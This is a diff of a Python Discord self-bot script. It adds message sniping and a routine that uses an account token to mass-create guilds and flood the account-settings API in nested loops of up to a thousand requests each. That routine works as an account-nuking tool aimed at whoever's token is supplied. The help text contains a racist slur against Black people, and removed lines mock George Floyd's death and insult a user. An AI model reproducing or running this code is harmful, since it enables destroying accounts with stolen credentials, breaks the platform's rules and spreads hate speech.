@@ -7,7 +7,6 @@ import asyncio
 import json
 from datetime import datetime
 import base64
-import keep_alive
 from itertools import cycle
 import io
 import linecache
@@ -21,23 +20,6 @@ bot = commands.Bot(command_prefix='!', self_bot=True)
 color = 3092790
 
 
-
-@bot.event
-async def on_message_delete(message):
-
-    global snipe_message_content
-    global snipe_message_author
-    global snipe_message_id
-
-    snipe_message_content = message.content
-    snipe_message_author = message.author.id
-    snipe_message_id = message.id
-    await asyncio.sleep(60)
-
-    if message.id == snipe_message_id:
-        snipe_message_author = None
-        snipe_message_content = None
-        snipe_message_id = None
 
 languages = {
               'da'    : 'Danish, Denmark',
@@ -89,6 +71,19 @@ locales = [
               "ko"
           ]
 
+@bot.event
+async def on_message_delete(message):
+    global snipe_message_content
+    global snipe_message_author
+    global snipe_message_id
+    snipe_message_content = message.content
+    snipe_message_author = message.author.id
+    snipe_message_id = message.id
+    await asyncio.sleep(60)
+    if message.id == snipe_message_id:
+        snipe_message_author = None
+        snipe_message_content = None
+        snipe_message_id = None
 
 @bot.event
 async def on_message(message):
@@ -126,24 +121,14 @@ async def on_message(message):
 **!guessinggame** - guessing game (if someone interrupts it breaks)
 **!nigrate** - sends ur nigrate u blackie 
 """)  
-
-        elif message.content == "!randomserver":
-          server = linecache.getline('servers.txt', random.randint(1, 350))
-          await message.channel.send(server)
-
-
           embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
           await message.channel.send(embed=embed)
 
-        elif message.content == "4ren":
-          await message.channel.send("u mean the retard monkey :clown: :clown: :clown: https://media.discordapp.net/attachments/921103626372526090/921151699735957594/unknown.png")
+  
+        elif message.content == "!randomserver":
+          server = linecache.getline('servers.txt', random.randint(1, 1600))
+          await message.channel.send(server)
 
-        elif message.content == "floyd":
-          await message.channel.send("i cant breathe")
-          await message.channel.send("https://i.imgur.com/mn3EslL.png")
-
-        elif message.content == "!furry":
-          await message.channel.send("loxi is furry")
 
         elif message.content == "!poll":
           await message.channel.send("Question?")
@@ -216,7 +201,6 @@ async def on_message(message):
           string_bytes = response2.encode("ascii")
           base64_bytes = base64.b64decode(string_bytes) 
           base64_string = base64_bytes.decode("ascii") 
-          await message.channel.send(f'Decoded: {base64_string}')
           embed = discord.Embed(title=f"Decoded: {base64_string}", color=color)
           await message.channel.send(embed=embed)
 
@@ -249,7 +233,7 @@ async def on_message(message):
             else:
               names = str(response2.content)
               headers = {
-                  'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+                  'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Safari/537.36',
                   'Content-Type': 'application/json',
                   'Authorization': _token,
               }
@@ -278,7 +262,7 @@ async def on_message(message):
                   'region': "europe"
               } 
               try:
-                for _i in range(50):
+                for _i in range(100):
                     requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
               except:
                 pass
@@ -289,15 +273,15 @@ async def on_message(message):
                       pass
                   else:
                       break
-              modes = cycle(["light", "dark"])
-              statuses = cycle(["online", "idle", "dnd", "invisible"])
-              for i in range(100):
+              modes = cycle(["light", "light"])
+              statuses = cycle(["online", "idle", "invisible"])
+              for i in range(1000):
                   setting = {
                       'theme': next(modes),
                       'locale': random.choice(locales),
                       'status': next(statuses)
                   }
-                  for i in range(100):
+                  for i in range(1000):
                       try:
                           request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
                       except KeyError:
@@ -527,7 +511,6 @@ async def on_message(message):
                 await message.channel.send(embed=embed)
                 await message.channel.send(f"Sent by: <@{snipe_message_author}>")
 
-
           
         elif message.content == "!guessinggame":
                 await message.channel.send('Guess a number from 1 to 5!')
@@ -550,6 +533,5 @@ async def on_message(message):
 
 
 
-
-keep_alive.keep_alive()            
+          
 bot.run(token)
